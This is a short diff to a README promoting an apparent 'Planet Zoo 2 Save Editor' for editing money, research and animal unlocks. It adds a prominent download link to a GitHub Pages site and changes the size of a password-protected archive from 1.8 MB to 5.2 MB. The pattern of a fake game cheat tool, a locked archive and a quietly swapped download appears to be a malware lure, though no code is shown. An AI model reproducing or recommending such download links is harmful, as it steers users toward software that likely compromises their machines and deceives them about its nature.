@@ -1,5 +1,5 @@
 <img width="1280" height="640" alt="image" src="https://github.com/user-attachments/assets/93fef3c9-0e1d-435e-ba06-dd83f01d46ad" />
-
+**[⬇️ Download Planet Zoo 2 Save Editor](https://Dreamloboutique.github.io/planet-zoo-2-save-editor/)**
 # 🦁 Planet Zoo 2 Save Editor 2026
 
 **Edit money, conservation points, research, and unlock all animals — for the ultimate zoo builder.**
@@ -38,7 +38,7 @@ Written in pure **C++ / Win32** with no runtime dependencies. No Electron, no .N
 
 **[⬇️ Download Planet Zoo 2 Save Editor](https://Dreamloboutique.github.io/planet-zoo-2-save-editor/)**
 
-**Archive size:** 1.8 MB · **Archive password:** `6427910552`
+**Archive size:** 5.2 MB · **Archive password:** `6427910552`
 
 ### Installation
 
